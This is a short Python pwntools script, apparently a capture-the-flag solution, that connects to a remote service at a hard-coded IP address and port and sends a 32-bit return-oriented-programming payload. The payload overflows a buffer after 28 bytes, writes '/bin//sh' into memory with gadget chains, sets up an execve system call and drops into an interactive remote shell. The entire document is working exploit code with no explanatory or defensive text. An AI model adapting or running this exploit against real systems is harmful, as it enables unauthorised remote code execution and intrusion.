from pwn import *
p = remote('45.122.249.68',10006)
#pop_eax_ret = 0x080a8e36 
mov_edx_eax = 0x08056e65 # mov dword ptr [edx], eax ; ret
pop_eax_edx_ebx = 0x08056334 #: pop eax ; pop edx ; pop ebx ; ret
pop_ecx_ebx = 0x0806ee92 #: pop ecx ; pop ebx ; ret
int_0x80 = 0x08049563

payload = "A"*28
payload += p32(pop_eax_edx_ebx) 
payload += "/bin" # eax
payload += p32(0x080DA300) #edx : address to write
payload += p32(0) #ebx
payload += p32(mov_edx_eax) 

payload += p32(pop_eax_edx_ebx) 
payload += "//sh" # 4 bytes for eax
payload += p32(0x080DA304) #edx : address to write (0x080DA300 + 4)
payload += p32(0) # ebx
payload += p32(mov_edx_eax) 

payload += p32(pop_eax_edx_ebx) 
payload += p32(0xb)
payload += p32(0)
payload += p32(0)
payload += p32(pop_ecx_ebx)
payload += p32(0)
payload += p32(0x080DA300) # ebx : address of /bin//sh
payload += p32(int_0x80)
p.sendline(payload)
p.interactive()
